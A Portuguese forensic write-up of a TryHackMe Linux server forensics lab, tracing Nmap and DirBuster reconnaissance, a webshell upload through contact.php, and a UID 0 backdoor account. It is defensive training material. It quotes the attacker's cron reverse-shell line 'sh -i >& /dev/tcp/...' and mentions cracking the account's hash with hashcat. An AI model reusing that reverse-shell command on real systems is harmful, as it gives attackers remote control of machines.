# Relatório Forense 
## Sala: https://tryhackme.com/room/linuxserverforensics (tarefa de 1 a 5)

# Resumo

O servidor web da ACME Web Design foi alvo de um ataque cibernético. O atacante utilizou ferramentas de reconhecimento (Nmap e DirBuster) para mapear o servidor, explorou uma vulnerabilidade de upload de ficheiros na página contact.php para obter acesso, e garantiu persistência através da criação de uma conta oculta com privilégios de root (root2) e de uma reverse shell agendada no cron. O servidor encontra-se completamente comprometido.

---

## Tarefa2 & Parte 1.1 - listagem completa do diretório de logs do apache2
```sh

fred@ip-10-114-143-156:/var/log/apache2$ ls -la
total 1360
drwxr-x---  2 root adm       4096 Nov 15 14:27 .
drwxrwxr-x 12 root syslog    4096 Nov 15 14:27 ..
-rw-r-----  1 root adm          0 Nov 15 14:27 access.log
-rw-r-----  1 root adm    1369411 Apr 20  2021 access.log.1
-rw-r-----  1 root adm        239 Nov 15 14:27 error.log
-rw-r-----  1 root adm       6745 May  3  2026 error.log.1
-rw-r-----  1 root adm          0 Apr 20  2021 other_vhosts_access.log
```

---

## Parte 1.2 - todos os user-agents

```sh
fred@ip-10-114-143-156:/var/log/apache2$ cut -d '"' -f6  access.log.1 | sort | uniq -c | sort -rn
   7310 DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)
     24 Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
     23 Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
     21 Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148
     21 -
     19 Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36
     19 curl/7.74.0
     15 Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36
     11 Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36
     11 Apache/2.4.29 (Ubuntu) (internal dummy connection)
      9 Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0
      7 Mozilla/5.0 (X11; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0
      7 Mozilla/5.0 CK={} (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
      3 Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36
      1 Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
      1
```
*Tem 2 user-agents suspeitos: DirBuster-1.0-RC1 e curl/7.74.0*

---

## Parte 1.3 - que IPs utilizaram cada uma dessas ferramentas, e horário

*NMAP*

```sh
fred@ip-10-114-143-156:/var/log/apache2$ cat access.log.1 | grep nmap  | head -n

192.168.56.24 - - [20/Apr/2021:09:53:46 +0000] "OPTIONS / HTTP/1.1" 200 181 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.56.24 - - [20/Apr/2021:09:53:46 +0000] "OPTIONS / HTTP/1.1" 200 181 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
```

*DIRBUSTER*

```sh
fred@ip-10-114-143-156:/var/log/apache2$ cat access.log.1 | grep -ia dirbuster  | head -n2
192.168.56.24 - - [20/Apr/2021:09:55:23 +0000] "HEAD / HTTP/1.1" 200 253 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.24 - - [20/Apr/2021:09:55:23 +0000] "HEAD / HTTP/1.1" 200 253 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
```

*CURL*

```sh
fred@ip-10-114-143-156:/var/log/apache2$ cat access.log.1 | grep -ia curl  | head -n2
192.168.56.8 - - [20/Apr/2021:09:29:11 +0000] "GET /products.html HTTP/1.1" 200 4182 "-" "curl/7.74.0"
192.168.56.8 - - [20/Apr/2021:09:34:29 +0000] "GET /products.html HTTP/1.1" 200 4182 "-" "curl/7.74.0"
```

*Conclui-se entao que as requisições feitas feitas pelas ferramentas nmap e dirbuster partiram do mesmo endereço de IP (192.168.56.24), enquanto curl partiu de um endereço de IP diferente (192.168.56.8)*

---

## Parte 1.4 que caminho estranho pediu o nmap

```sh
fred@ip-10-114-143-156:/var/log/apache2$ cat access.log.1 | grep nmap | awk '{print $7, $8}'
/ HTTP/1.1"
/ HTTP/1.1"
/ HTTP/1.1"
/ HTTP/1.1"
/ HTTP/1.1"
/nmaplowercheck1618912425 HTTP/1.1"
```

* caminho estranho é: /nmaplowercheck1618912425*

---
# Parte 2
## Parte 2.1 - arquivo que permite fazer upload de arquivos

```sh

fred@ip-10-114-143-156:/var/log/apache2$ cat access.log.1 | grep -a POST

192.168.56.24 - - [20/Apr/2021:09:57:40 +0000] "POST /contact.php HTTP/1.1" 200 1018 "http://192.168.56.9/contact.php" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
```

*O arquivo de formulário php que permite anexar arquivos é: contact.php*

---

## Parte 2.2 - quem enviou os dados para essa página

```sh

fred@ip-10-114-143-156:/var/log/apache2$ cat access.log.1 | grep -a POST

192.168.56.24 - - [20/Apr/2021:09:57:40 +0000] "POST /contact.php HTTP/1.1" 200 1018 "http://192.168.56.9/contact.php" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
```

*Os dados foram enviados por esse endereço de IP: 192.168.56.24*

---

## Parte 2.3 - o que o dirbuster encontrou no server (páginas escondidas)

O scanner *dirbuster* encontrou várias pastas escodindas fazendo fuzzing de diretório, de entre as quais, a mais importante é: */resources/development/2021/docs/SECURITY.md*

```sh
cat access.log.1 | grep -ai "dirbuster" | grep '" 200'
192.168.56.24 - - [20/Apr/2021:09:55:34 +0000] "GET /resources/development/2021/docs/SECURITY.md HTTP/1.1" 200 507 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
```

*Acessando via web, descobre-se que foi o Fred que assinou o referido documento*

*Leitura da prova:*

Acedendo ao ficheiro via web, descobrimos um aviso deixado por "Fred". O documento diz explicitamente: "we have to really got to sort out the contact page theres NO validation whatsoever. I can't belive we haven't been hacked yet - Fred."

Isto confirma que a página contact.php (onde o atacante fez o POST) é altamente vulnerável por falta de validação, permitindo o upload de ficheiros arbitrários (webshell), exatamente como o atacante fez.

---

## Parte 2.4 - outros visitantes

```sh

fred@ip-10-114-143-156:/var/log/apache2$ cat access.log.1 | grep -aiEv "dirbuster|mozzila|chrome|firefox|Mozilla/5.0" | grep '" 200'

192.168.56.54 - - [20/Apr/2021:09:44:47 +0000] "GET /products.html HTTP/1.1" 200 4182 "-" "curl/7.74.0"
::1 - - [20/Apr/2021:09:55:32 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) (internal dummy connection)"
```
---

# Parte 3
## Parte 3.1 - agenda de tarefas automáticas se comentários

```sh

fred@ip-10-114-143-156:/var/log/apache2$ cat /etc/crontab | grep -iav '^#'

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root2   sh -i >& /dev/tcp/192.168.56.206/1234 0>&1
```

## Parte 3.2 - explicação do comando agendado

Esse comando é rodado a cada *1 minuto*, com a conta *root2* , com o comando *sh -i >& /dev/tcp/192.168.56.206/1234 0>&1* e abre uma *conexão TCP reversa* (reverse shell) conectando na máquina de endereço IP *192.168.56.206* na porta *1234*, dando acesso ao shell do servidor para o atacante, basicamente se trata de um backdoor persistente.

---

# Parte 4
## Parte 4.1 - procurar contas com chave mestra (UID 0)

```sh
fred@ip-10-114-143-156:/var/log/apache2$ cat /etc/passwd | grep root | grep ':0'
root:x:0:0:root:/root:/bin/bash
root2:***:0:0:root:/root:/bin/bash
```
---

*As contas com ID do utilizador 0, é root, e root2 (conta suspeita, com mesmo previlégios root)*

## Parte 4.2 - porque esta conta é tão perigosa, o que tem de estranho no 2.º campo da linha

Essa conta é perigosa porque tem *UID setado pra 0*, ou seja, com os mesmos previlégios da conta root (administrador do sistema), e no segundo campo da linha tem a hash da senha desse utilizador (root2) que pode ser facilmente quebrada com o hashcat usando o módulo 1500 (DES/descrypt).

---

# Parte 5 - quando/linha-temporal
## Parte 5.1 - provas por ordem de hora

| Hora (UTC) | IP | O que aconteceu | Prova (ficheiro e comando) |
| :--- | :--- | :--- | :--- |
| 20/Abr/2021:09:29:11 | 192.168.56.8 | Acesso inicial (possivelmente verificação do site) usando `curl` | `access.log.1` · `grep -a "curl" access.log.1` |
| 20/Abr/2021:09:53:46 | 192.168.56.24 | Reconhecimento com Nmap (pedido ao caminho estranho `/nmaplowercheck...`) | `access.log.1` · `grep -a "Nmap" access.log.1` |
| 20/Abr/2021:09:55:23 | 192.168.56.24 | Fuzzing de diretórios com DirBuster à procura de páginas escondidas | `access.log.1` · `grep -a "DirBuster" access.log.1` |
| 20/Abr/2021:09:55:34 | 192.168.56.24 | DirBuster encontra o ficheiro `SECURITY.md` (que revela falha no `contact.php`) | `access.log.1` · `grep -ai "dirbuster" access.log.1 \| grep '" 200'` |
| 20/Abr/2021:09:57:40 | 192.168.56.24 | Exploração da falha: Upload de webshell via `POST` para `/contact.php` | `access.log.1` · `grep -a "POST" access.log.1` |
| (Agendado via cron) | 192.168.56.206 | Persistência: Reverse shell aberta a cada minuto pela conta `root2` | `/etc/crontab` · `grep -v '^#' /etc/crontab` |
| (Após o POST) | Local | Criação da conta backdoor `root2` com UID 0 | `/etc/passwd` · `awk -F: '$3 == 0' /etc/passwd` |

## Parte 5.2 - recomendações para a ACME

*Possíveis correções:*
  - Fazer revisão do código php do arquivo contact.php, e mitigar a possível falha que permite subir uma webshell;
  - Atualizar o sistema operativo do server, e excluir possíveis brechas que permitiram ao atacante escalonar previlégios para root.
